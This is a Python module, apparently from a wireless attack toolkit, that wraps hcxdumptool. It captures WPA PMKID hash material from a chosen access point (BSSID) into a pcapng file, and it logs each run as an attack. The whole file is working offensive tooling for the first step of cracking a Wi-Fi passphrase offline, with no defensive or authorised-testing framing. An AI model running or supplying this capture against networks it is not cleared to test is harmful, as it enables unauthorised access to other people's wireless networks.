"""
PMKID Capture: uses hcxdumptool or a custom Scapy approach.
"""
import shutil
import subprocess
import os


class PMKIDCapture:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def run(self, args):
        bssid = args.bssid
        iface = self.config.mon_iface
        output = args.output or "pmkid.pcapng"

        self.logger.attack_log(f"PMKID capture -> {bssid} -> {output}")
        if shutil.which("hcxdumptool"):
            try:
                cmd = ["hcxdumptool", "-i", iface, "-o", output, "--filterlist_ap=" + bssid, "--filtermode=2"]
                subprocess.run(cmd, timeout=args.timeout)
                self.logger.success("PMKID capture complete.")
                return True
            except Exception as e:
                self.logger.error(f"hcxdumptool failed: {e}")
                return False
        else:
            self.logger.warning("hcxdumptool not found. Install hcxtools first.")
            return False
